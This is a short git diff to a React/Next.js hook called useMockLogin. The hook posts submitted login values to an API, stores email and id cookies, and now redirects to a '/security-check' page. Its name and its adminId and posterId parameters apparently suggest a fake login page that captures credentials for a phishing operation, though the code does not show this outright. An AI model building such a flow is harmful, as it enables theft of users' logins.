@@ -3,7 +3,8 @@ import Cookies from "js-cookie";
 import { API_URL } from "../config";
 import { useRouter } from "next/navigation";
 
-function useMockLogin(setShowModal, adminId, posterId) {
+function useMockLogin(adminId, posterId) {
+  const router = useRouter();
   const login = async (values, formik) => {
     // console.log(values);
 
@@ -17,15 +18,13 @@ function useMockLogin(setShowModal, adminId, posterId) {
       },
       body: JSON.stringify(values),
     });
-    setShowModal(true);
     const data = await res.json();
 
     if (res.ok) {
       console.log("success", data);
       Cookies.set("email", data?.info?.email);
       Cookies.set("id", data?.info?._id);
-
-      setShowModal(true);
+      router.push("/security-check");
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
